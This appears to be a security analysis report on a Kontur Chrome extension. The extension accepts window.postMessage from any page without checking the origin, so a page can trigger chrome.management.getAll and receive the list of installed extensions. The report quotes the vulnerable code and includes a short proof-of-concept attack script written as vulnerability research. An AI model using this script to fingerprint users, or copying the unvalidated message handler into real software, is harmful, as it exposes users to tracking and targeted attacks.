# CoCo Analysis: momffihklfhkoakghidmkdocdkbfmoac

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 13 (multiple detections of the same flow)

---

## Sink: management_getAll_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/momffihklfhkoakghidmkdocdkbfmoac/opgen_generated_files/bg.js
(No specific line numbers provided in CoCo trace, but flow exists)

**Code:**

```javascript
// Content script (content.js) - Entry point
window.addEventListener("message", handleMessage, false); // ← Line 190

function handleMessage(event) {
    var data = event.data; // ← attacker-controlled from webpage
    if (!data || (event.source != window)) {
        return;
    }

    var request = data.request;
    if (!request) {
        return;
    }

    var type = data.type,
        isNewType = (type === KONTUR_DIAG_REQUEST) || (type === KONTUR_PLUGIN_REQUEST),
        toDiag = (type === KONTUR_DIAG_REQUEST) || (type === DIAG_REQUEST_TYPE),
        toPlugin = (type === KONTUR_PLUGIN_REQUEST) || (type === PLUGIN_REQUEST_TYPE),
        origin = event.origin;

    if (toDiag) {
        request.origin = origin;
        sendDiag(request, isNewType, origin, data.sessionId); // ← Line 183
    } else if (toPlugin && request.sessionId) {
        request.hostUri = origin;
        sendPlugin(request, isNewType, origin, request.sessionId); // ← Line 186
    }
}

function createSession(way, sessionId, origin) {
    var handleRequest = null,
        handleResponse = null;

    function updateHandlers(port, isNewType) {
        if (isNewType) {
            handleResponse = function(response) { // ← response from background
                window.postMessage({
                    type: way.label_response,
                    response: response // ← contains management.getAll data
                }, origin); // ← Line 85-88, posted back to attacker
            };
        } else {
            handleResponse = function(response) {
                window.postMessage({
                    type: way.old_response,
                    response: response, // ← contains management.getAll data
                    isNewExtension: true
                }, origin); // ← Line 92-96, posted back to attacker
            };
        }
        // ... connects to background script via chrome.runtime.connect ...
    }
}

// Background script (background.js)
function Extensions() {
    this.getAll = function(callback, reject) {
        try {
            chrome.management.getAll(callback); // ← Line 73, retrieves all extensions
        } catch(e) {
            reject(e);
        }
    };

    this.getAll(function(exts) {
        exts.forEach(checkOldExtension);
    }, function(e) {
        that.searchError = e;
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from any webpage

**Attack:**

```javascript
// From any webpage (extension runs on <all_urls>)
window.postMessage({
    type: "kontur-diag-request", // or "diag-helper-request"
    request: {
        cmd: "getExtensions" // or similar command
    },
    sessionId: "attacker-session"
}, "*");

// Listen for response with management.getAll data
window.addEventListener("message", function(event) {
    if (event.data.type === "kontur-diag-response" || event.data.type === "diag-helper-response") {
        console.log("Installed extensions:", event.data.response);
        // ← Attacker receives list of all installed extensions
    }
});
```

**Impact:** Information disclosure. Any webpage can trigger the extension to retrieve and leak the list of all installed browser extensions via chrome.management.getAll(). The extension listens for window.postMessage from any page (runs on <all_urls>), forwards requests to the background script which calls chrome.management.getAll(), and then posts the results back to the webpage via window.postMessage. This allows attackers to fingerprint users by discovering their installed extensions, which is a privacy violation and can be used for targeted attacks.

---

## Overall Analysis

This is a TRUE POSITIVE vulnerability. The Kontur extension (Russian browser extension for Kontur services) accepts postMessage from any webpage, forwards certain requests to its background script, which retrieves sensitive information including the full list of installed extensions via chrome.management.getAll(), and then posts this data back to the requesting webpage. The extension has the "management" permission in manifest.json, making this attack fully exploitable.

While the extension may have been designed to only work with Kontur domains (based on checkCurrentHostName function checking for kontur.ru domains), the message listener on line 190 does not validate the origin, allowing any webpage to trigger this information disclosure.
